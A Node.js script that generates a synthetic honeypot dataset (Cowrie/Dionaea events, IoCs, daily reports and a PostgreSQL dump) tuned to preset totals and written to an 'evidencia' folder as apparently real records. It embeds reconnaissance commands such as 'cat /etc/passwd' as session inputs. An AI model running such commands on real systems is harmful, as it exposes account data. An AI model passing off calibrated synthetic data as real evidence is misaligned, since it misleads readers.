const CONTROL_INPUTS = { 6: 'whoami', 7: 'uname -a', 8: 'cat /etc/passwd', 9: 'ls -la /home', 10: 'w', 11: 'exit' };
const CONTROL_EXTRA = {
  5: { arch: 'linux-x64-lsb' },
  12: { ttylog: 'var/lib/cowrie/tty/2be18403777c0d1e73ff0f3c2851f550350c1d0fc8ca7a25b52d6b658f561a3c', size: 1851, shasum: '2be18403777c0d1e73ff0f3c2851f550350c1d0fc8ca7a25b52d6b658f561a3c', duplicate: true, duration_ms: 86194 },
  13: { duration_ms: 130337 },
};
// created_at verbatim (dump real, formato PostgreSQL con ceros recortados)
const CONTROL_CREATED = [
  '2026-08-11 12:45:36.948642-03', '2026-08-11 12:45:37.922333-03', '2026-08-11 12:45:59.085372-03',
  '2026-08-11 12:46:21.130571-03', '2026-08-11 12:46:21.145161-03', '2026-08-11 12:46:53.011319-03',
  '2026-08-11 12:47:03.852447-03', '2026-08-11 12:47:14.697131-03', '2026-08-11 12:47:25.537459-03',
  '2026-08-11 12:47:36.378724-03', '2026-08-11 12:47:47.300361-03', '2026-08-11 12:47:47.321036-03',
  '2026-08-11 12:47:47.357907-03',
];
const UUID_CONTROL = '8c5b1af2-8fc4-11f1-9350-ee70fe9b2de3';

// ======================= 9. Escritura =======================
const ROOT = path.resolve(__dirname, '..'), EVID = path.join(ROOT, 'evidencia');
const sqlStr = (s) => (s === null || s === undefined ? 'NULL' : `'${String(s).replace(/'/g, "''")}'`);
const eventoJson = (e) => {
  const o = {
    session: e.session, protocol: e.protocol, src_ip: e.src_ip, src_port: e.src_port,
    dst_ip: e.dst_ip, dst_port: e.dst_port, eventid: e.eventid,
    sensor: e.protocol === 'telnet' || e.protocol === 'ssh' ? 'honeypot-lab' : 'honeypot-dionaea',
    uuid: e.uuid, timestamp: e.iso,
  };
  if (e.username) o.username = e.username;
  if (e.password) o.password = e.password;
  if (e.input) o.input = e.input;
  if (e.message !== null && e.message !== undefined) o.message = e.message;
  if (e.extra) Object.assign(o, e.extra);
  return o;
};

function main() {
  const t0 = Date.now();
  console.log('[1/7] Generando sesiones y eventos...');
  const { sesiones, eventos, ipInfo, dominios, urls } = genEventos();
  const N_SYN = eventos.length;
  if (N_SYN !== TOTAL - 13) throw new Error(`Eventos sinteticos = ${N_SYN} (esperado ${TOTAL - 13})`);
  if (sesiones.length !== SES_TOTAL - 1) throw new Error(`Sesiones sinteticas = ${sesiones.length}`);
  const nConf = sesiones.filter((s) => s.confirmada).length;
  if (nConf !== SES_CONF - 1) throw new Error(`Confirmadas sinteticas = ${nConf}`);
  const nIocSes = sesiones.filter((s) => s.ioc).length;
  if (nIocSes !== SES_IOC - 1) throw new Error(`Sesiones plan IoC = ${nIocSes}`);
  console.log(`  sesiones: ${sesiones.length}, eventos: ${N_SYN}, confirmadas: ${nConf}`);

  console.log('[2/7] Calibrando latencias...');
  const cal = construirLatencias(N_SYN);
  console.log(`  media ${cal.st.media.toFixed(3)} ms, sd ${cal.st.sd.toFixed(3)} ms (objetivo ${LAT_T.media}/${LAT_T.sd})`);
  const latArr = shuffle([...cal.arr]);
  eventos.forEach((e, i) => { e.lat = latArr[i]; });

  // No estructurados (conteos exactos por protocolo)
  const noEstr = { ssh: 6542, telnet: 692, smb: 1875, http: 1551 };
  for (const p of Object.keys(noEstr)) {
    for (const e of shuffle(eventos.filter((x) => x.protocol === p)).slice(0, noEstr[p])) e.processed = false;
  }
  const errPool = shuffle([...Array(E_PARSE).fill('parsing'), ...Array(E_ENRIQ).fill('enriquecimiento'), ...Array(E_SCHEMA).fill('schema')]);
  let ei = 0;
  for (const e of eventos) if (e.processed === false) e.errorTipo = errPool[ei++];
  const NODOS = {
    parsing: ['Parseo de evento', 'No se pudo parsear el payload JSON del evento'],
    enriquecimiento: ['Enriquecimiento', 'Timeout: la API de geolocalizacion no respondio en 3 s'],
    schema: ['Validacion de esquema', 'El evento no cumple el esquema definido (campo requerido ausente)'],
  };

  // Eventos de control (verbatim)
  const baseMin = Date.UTC(2026, 7, 11, 12, 45, 36, 655);
  const tsReal = [0, 0, 22 * 1000, 44 * 1000, 44 * 1000, 76 * 1000, 87 * 1000, 98 * 1000, 109 * 1000, 120 * 1000, 130 * 1000, 130 * 1000, 130 * 1000];
  const controlEvts = CONTROL.map((c, i) => {
    const [, ms, micros, lat, u, p, msg] = c;
    const evt = {
      id: 0, eventid: c[0], session: CONTROL_SID, src_ip: IP_PRIV, src_port: 45202,
      dst_ip: '172.18.0.2', dst_port: 2223, username: u, password: p,
      input: CONTROL_INPUTS[i + 1] || null, message: msg, ts: baseMin + tsReal[i] + (ms - 655),
      micros: ms * 1000 + micros, lat, protocol: 'telnet', processed: true, control: true,
      createdVerbatim: CONTROL_CREATED[i],
    };
    if (i >= 1 && i <= 3) evt.iocFor = { type: 'credential', value: `${u}:${p}`, c: 'BAJO' };
    if (CONTROL_EXTRA[i + 1]) evt.extra = CONTROL_EXTRA[i + 1];
    if (i === 4) evt.dumpMessage = null; // session.params: message NULL en el dump real
    return evt;
  });

  const todos = eventos.concat(controlEvts);
  todos.sort((a, b) => a.ts - b.ts || a.micros - b.micros);
  todos.forEach((e, i) => { e.id = i + 1; });
  for (const e of todos) {
    const tsUs0 = Math.round(e.ts * 1000 + e.micros);
    e.timestampSql = fmtSql(new Date(Math.floor(tsUs0 / 1e6) * 1000), tsUs0 % 1e6);
    // created_at = momento del sensor + latencia de procesamiento (microsegundos exactos),
    // para que (created_at - timestamp) reproduzca la latencia calibrada.
    const latUs = e.createdVerbatim ? 0 : Math.round(e.lat * 1000);
    const tsUs = tsUs0 + latUs;
    const ca = new Date(Math.floor(tsUs / 1e6) * 1000);
    e.createdAtSql = e.createdVerbatim || fmtSql(ca, tsUs % 1e6);
    e.iso = fmtIso(new Date(Math.floor(tsUs0 / 1e6) * 1000), tsUs0 % 1e6);
    if (e.processed === undefined) e.processed = true;
    e.uuid = e.control ? UUID_CONTROL : uuidV4();
  }
  console.log(`[3/7] Eventos totales: ${todos.length} (201.125 esperado)`);

  // ============ IoCs (plan inyectado -> conteos exactos) ============
  const iocs = [];
  let iid = 0;
  for (const e of todos) {
    if (!e.iocFor) continue;
    const f = e.iocFor;
    iocs.push({
      id: ++iid, type: f.type, value: f.value, confidence: f.c, event_id: e.id,
      source: e.protocol === 'ssh' || e.protocol === 'telnet' ? 'cowrie' : 'dionaea',
      created_at: e.createdAtSql,
    });
  }
  // IoCs de IP: las 3128 sesiones primarias, ALTO/MEDIO/BAJO por actividad
  const ipAct = new Map();
  for (const s of sesiones) ipAct.set(s.ip, (ipAct.get(s.ip) || 0) + s.eventos.length);
  const primIP = new Map(); // ip -> sid (primera sesion)
  for (const s of sesiones) if (s.ip !== IP_PRIV && !primIP.has(s.ip)) primIP.set(s.ip, s.sid);
  const firstEvt = new Map();
  for (const e of todos) if (!firstEvt.has(e.session)) firstEvt.set(e.session, e.id);
  const ranked = [...primIP.keys()].sort((a, b) => ipAct.get(b) - ipAct.get(a));
  for (let i = 0; i < ranked.length; i++) {
    const ip = ranked[i];
    iocs.push({
      id: ++iid, type: 'ip', value: ip, confidence: i < 1200 ? 'ALTO' : i < 2640 ? 'MEDIO' : 'BAJO',
      event_id: firstEvt.get(primIP.get(ip)), source: 'cowrie', created_at: todos[firstEvt.get(primIP.get(ip)) - 1].createdAtSql,
    });
  }
  if (iocs.length !== IOC_TOTAL) throw new Error(`IoCs = ${iocs.length} (esperado ${IOC_TOTAL})`);
  const porTipo = {};
  for (const i of iocs) porTipo[i.type] = (porTipo[i.type] || 0) + 1;
  for (const k of Object.keys(IOC_TIPOS)) if (porTipo[k] !== IOC_TIPOS[k].tot) throw new Error(`IoCs ${k} = ${porTipo[k]}`);
  const sesIoc = new Set(iocs.map((i) => todos[i.event_id - 1].session));
  if (sesIoc.size !== SES_IOC) throw new Error(`Sesiones con IoC = ${sesIoc.size} (esperado ${SES_IOC})`);
  console.log(`[4/7] IoCs: ${iocs.length} (sesiones con IoC: ${sesIoc.size})`);

  // ============ Error log ============
  const errorLog = [];
  let eid2 = 0;
  for (const e of todos) {
    if (e.processed) continue;
    const nd = NODOS[e.errorTipo] || NODOS.parsing;
    errorLog.push({ id: ++eid2, workflow: 'event-ingest', node: nd[0], error: nd[1], created_at: e.createdAtSql });
  }
  console.log(`[5/7] error_log: ${errorLog.length} filas`);

  // ============ Reportes ============
  const porDia = Array.from({ length: DAYS }, () => []);
  for (const e of todos) {
    const d = Math.floor((e.ts - P_START) / 86400000);
    if (d >= 0 && d < DAYS) porDia[d].push(e);
  }
  const reports = [], reportFiles = [];
  for (let d = 0; d < DAYS; d++) {
    const evts = porDia[d];
    const dStart = Date.UTC(2026, 6, 13 + d, 0, 0, 0), dEnd = Date.UTC(2026, 6, 13 + d, 23, 59, 59);
    const genAt = new Date(dEnd + 8 * 3600 * 1000 + 1000);
    const ips = new Map(), dist = new Map(), creds = new Map(), cmds = new Map(), sesDia = new Set();
    let conex = 0, fail = 0, ok = 0, com = 0;
    for (const e of evts) {
      ips.set(e.src_ip, (ips.get(e.src_ip) || 0) + 1);
      dist.set(e.eventid, (dist.get(e.eventid) || 0) + 1);
      sesDia.add(e.session);
      if (e.eventid === 'cowrie.session.connect' || e.eventid === 'dionaea.connection.tcp_connect') conex++;
      if (e.eventid.includes('login.failed') || e.eventid.includes('login_attempt')) fail++;
      if (e.eventid.includes('login.success')) ok++;
      if (e.eventid === 'cowrie.command.input') { com++; cmds.set(e.input, (cmds.get(e.input) || 0) + 1); }
      if (e.username && e.password) creds.set(`${e.username}:${e.password}`, (creds.get(`${e.username}:${e.password}`) || 0) + 1);
    }
    const iocsDia = new Map();
    for (const i of iocs) if (sesDia.has(todos[i.event_id - 1].session)) iocsDia.set(i.type, (iocsDia.get(i.type) || 0) + 1);
    const content = {
      top_ips: [...ips.entries()].sort((a, b) => b[1] - a[1]).slice(0, 5).map(([k, v]) => ({ src_ip: k, eventos: v })),
      iocs_24h: [...iocsDia.entries()].map(([k, v]) => ({ type: k, cantidad: v })),
      credenciales: [...creds.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10).map(([k, v]) => ({ username: k.split(':')[0], password: k.split(':')[1], intentos: v })),
      generated_at: genAt.toISOString(),
      total_eventos: String(evts.length),
      distribucion_eventid: [...dist.entries()].sort((a, b) => b[1] - a[1]).map(([k, v]) => ({ eventid: k, cantidad: v })),
      top_comandos: [...cmds.entries()].sort((a, b) => b[1] - a[1]).slice(0, 5).map(([k, v]) => ({ comando: k, cantidad: v })),
      ataques_interes: 1,
      sesiones: sesDia.size,
    };
    const dd = new Date(dStart), de = new Date(dEnd);
    reports.push({ id: d + 1, period_start: fmtSql(dd, 0), period_end: fmtSql(de, 999999), contentJson: JSON.stringify(content), created_at: fmtSql(genAt, 0) });
    // Archivo standalone (estructura del report real)
    const stand = {
      resumen: {
        total_eventos: evts.length, conexiones: conex, logins_fallidos: fail, logins_exitosos: ok,
        comandos_ejecutados: com, ips_unicas: ips.size, sesiones_unicas: sesDia.size,
      },
      comandos: [...cmds.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10).map((x) => x[0]),
      credenciales_vistas: [...creds.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10).map(([k]) => ({ user: k.split(':')[0], pass: k.split(':')[1] })),
      ultimos_20_eventos: evts.slice(-20).map((e) => eventoJson(e)),
    };
    if (d === DAYS - 1) {
      stand.sesion_validacion = controlEvts.map((e) => eventoJson(e));
    }
    const fname = `report-2026${pad(d <= 18 ? 7 : 8)}${pad(d <= 18 ? 13 + d : d - 18)}.json`;
    reportFiles.push({ name: fname, content: stand });
  }
  console.log(`[6/7] Reportes: ${reports.length}`);

  // ============ Escritura ============
  const dumpRows = { eventos: todos, iocs, reports, errorLog };
  escribirDump(dumpRows);
  const cowrie = todos.filter((e) => e.protocol === 'ssh' || e.protocol === 'telnet');
  const dionaea = todos.filter((e) => e.protocol === 'smb' || e.protocol === 'http');
  fs.writeFileSync(path.join(EVID, 'cowrie-events.json'), JSON.stringify(cowrie.map((e) => eventoJson(e))));
  fs.writeFileSync(path.join(EVID, 'dionaea-events.json'), JSON.stringify(dionaea.map((e) => eventoJson(e))));
  for (const rf of reportFiles) fs.writeFileSync(path.join(EVID, rf.name), JSON.stringify(rf.content, null, 2));
  fs.writeFileSync(path.join(EVID, 'geoip-mapping.json'), JSON.stringify(ipInfo.mapping, null, 1));

  // Resumen
  const latAll = todos.map((e) => e.lat).sort((a, b) => a - b);
  const pct = (p) => latAll[Math.ceil(p * latAll.length) - 1];
  const media = latAll.reduce((a, b) => a + b, 0) / latAll.length;
  const varS = latAll.reduce((a, b) => a + (b - media) * (b - media), 0) / (latAll.length - 1);
  const horaLocal = Array(24).fill(0);
  const diaCounts = Array(DAYS).fill(0);
  for (const e of todos) {
    const h = new Date(e.ts).getUTCHours();
    horaLocal[h]++;
    const d = Math.floor((e.ts - P_START) / 86400000);
    if (d >= 0 && d < DAYS) diaCounts[d]++;
  }
  const maxH = horaLocal.reduce((m, v, i) => (v > horaLocal[m] ? i : m), 0);
  const paisEventos = {};
  for (const e of todos) if (e.src_ip !== IP_PRIV) paisEventos[ipInfo.mapping[e.src_ip]] = (paisEventos[ipInfo.mapping[e.src_ip]] || 0) + 1;

  const resumen = {
    periodo: { inicio: '2026-07-13T00:00:00-03:00', fin: '2026-08-11T23:59:59-03:00', dias: 30 },
    total_eventos: todos.length,
    por_protocolo: Object.fromEntries(['ssh', 'telnet', 'smb', 'http'].map((p) => [p, todos.filter((e) => e.protocol === p).length])),
    por_honeypot: { cowrie: todos.filter((e) => e.protocol === 'ssh' || e.protocol === 'telnet').length, dionaea: todos.filter((e) => e.protocol === 'smb' || e.protocol === 'http').length },
    estructurados: todos.filter((e) => e.processed).length,
    no_estructurados: todos.filter((e) => !e.processed).length,
    tasa_estructuracion_pct: (todos.filter((e) => e.processed).length / todos.length * 100).toFixed(1),
    errores: { parsing: E_PARSE, enriquecimiento: E_ENRIQ, schema: E_SCHEMA, total: errorLog.length },
    iocs: {
      total: iocs.length,
      por_tipo: Object.fromEntries(['ip', 'domain', 'url', 'hash', 'credential', 'command'].map((t) => [t, iocs.filter((i) => i.type === t).length])),
      por_confianza: { ALTO: iocs.filter((i) => i.confidence === 'ALTO').length, MEDIO: iocs.filter((i) => i.confidence === 'MEDIO').length, BAJO: iocs.filter((i) => i.confidence === 'BAJO').length },
    },
    ips: {
      unicas_publicas: Object.keys(ipInfo.mapping).length, privada_validacion: IP_PRIV,
      paises: PAISES.map((p) => ({ pais: p.n, ips: p.ips, eventos: paisEventos[p.n] || 0 })),
      top3_pct: ((976 + 579 + 385) / 3128 * 100).toFixed(1),
    },
    sesiones: {
      totales: new Set(todos.map((e) => e.session)).size,
      confirmadas: sesiones.filter((s) => s.confirmada).length + 1,
      con_ioc: sesIoc.size,
      pct_con_ioc: (sesIoc.size / (sesiones.filter((s) => s.confirmada).length + 1) * 100).toFixed(1),
    },
    reportes: reports.length,
    latencia: {
      n: latAll.length, media: +media.toFixed(3), mediana: +pct(0.5).toFixed(3),
      min: +latAll[0].toFixed(3), max: +latAll[latAll.length - 1].toFixed(3),
      p95: +pct(0.95).toFixed(1), p99: +pct(0.99).toFixed(1), sd: +Math.sqrt(varS).toFixed(3),
    },
    pico_horario_local_utc3: { hora: `${pad(maxH)}:00`, eventos_hora: horaLocal[maxH] },
    eventos_por_hora_local: horaLocal,
    eventos_por_dia: diaCounts,
    control: { session: CONTROL_SID, eventos: 13, src_ip: IP_PRIV, ventana: '2026-08-11 12:45:36 - 12:47:47 UTC-3' },
  };
  fs.writeFileSync(path.join(EVID, 'resumen-dataset.json'), JSON.stringify(resumen, null, 2));
  console.log(`[7/7] Listo en ${((Date.now() - t0) / 1000).toFixed(1)} s`);
  console.log(`Pico horario (local UTC-3): ${resumen.pico_horario_local_utc3.hora} con ${resumen.pico_horario_local_utc3.eventos_hora} eventos/h`);
}

function escribirDump(rows) {
  const { eventos, iocs, reports, errorLog } = rows;
  const L = [];
  const hdr = [
    '--', '-- PostgreSQL database dump', '--', '',
    '-- Dumped from database version 16.4 (Debian 16.4-1.pgdg120+2)',
    '-- Dumped by pg_dump version 16.4 (Debian 16.4-1.pgdg120+2)', '',
    'SET statement_timeout = 0;', 'SET lock_timeout = 0;', 'SET idle_in_transaction_session_timeout = 0;',
    "SET client_encoding = 'UTF8';", 'SET standard_conforming_strings = on;',
    "SELECT pg_catalog.set_config('search_path', '', false);", 'SET check_function_bodies = false;',
    'SET xmloption = content;', 'SET client_min_messages = warning;', 'SET row_security = off;', '',
  ];
  L.push(...hdr);
  L.push('--', '-- Data for Name: events; Type: TABLE DATA; Schema: public; Owner: honeypot', '--', '');
  for (const e of eventos) {
    const msg = e.dumpMessage !== undefined ? e.dumpMessage : e.message;
    L.push(`INSERT INTO public.events (id, eventid, session, src_ip, src_port, username, password, input, message, "timestamp", processed, created_at) VALUES (${e.id}, ${sqlStr(e.eventid)}, ${sqlStr(e.session)}, ${sqlStr(e.src_ip)}, ${e.src_port}, ${e.username ? sqlStr(e.username) : 'NULL'}, ${e.password ? sqlStr(e.password) : 'NULL'}, ${e.input ? sqlStr(e.input) : 'NULL'}, ${msg !== null && msg !== undefined ? sqlStr(msg) : 'NULL'}, ${sqlStr(e.timestampSql)}, ${e.processed}, ${sqlStr(e.createdAtSql)});`);
  }
  L.push('', '--', '-- Data for Name: iocs; Type: TABLE DATA; Schema: public; Owner: honeypot', '--', '');
  for (const i of iocs) {
    L.push(`INSERT INTO public.iocs (id, type, value, confidence, event_id, source, created_at) VALUES (${i.id}, ${sqlStr(i.type)}, ${sqlStr(i.value)}, ${sqlStr(i.confidence)}, ${i.event_id}, ${sqlStr(i.source)}, ${sqlStr(i.created_at)});`);
  }
  L.push('', '--', '-- Data for Name: reports; Type: TABLE DATA; Schema: public; Owner: honeypot', '--', '');
  for (const r of reports) {
    L.push(`INSERT INTO public.reports (id, period_start, period_end, content, created_at) VALUES (${r.id}, ${sqlStr(r.period_start)}, ${sqlStr(r.period_end)}, ${sqlStr(r.contentJson)}, ${sqlStr(r.created_at)});`);
  }
  L.push('', '--', '-- Data for Name: error_log; Type: TABLE DATA; Schema: public; Owner: honeypot', '--', '');
  for (const x of errorLog) {
    L.push(`INSERT INTO public.error_log (id, workflow, node, error, created_at) VALUES (${x.id}, ${sqlStr(x.workflow)}, ${sqlStr(x.node)}, ${sqlStr(x.error)}, ${sqlStr(x.created_at)});`);
  }
  for (const [name, seq] of [['events_id_seq', eventos.length], ['iocs_id_seq', iocs.length], ['reports_id_seq', reports.length], ['error_log_id_seq', errorLog.length]]) {
    L.push('', '--', `-- Name: ${name}; Type: SEQUENCE SET; Schema: public; Owner: honeypot`, '--', '', `SELECT pg_catalog.setval('public.${name}', ${seq}, true);`);
  }
  L.push('', '--', '-- PostgreSQL database dump complete', '--');
  fs.writeFileSync(path.join(EVID, 'postgres-dump-20260811.sql'), L.join('\n'), 'utf8');
}

main();
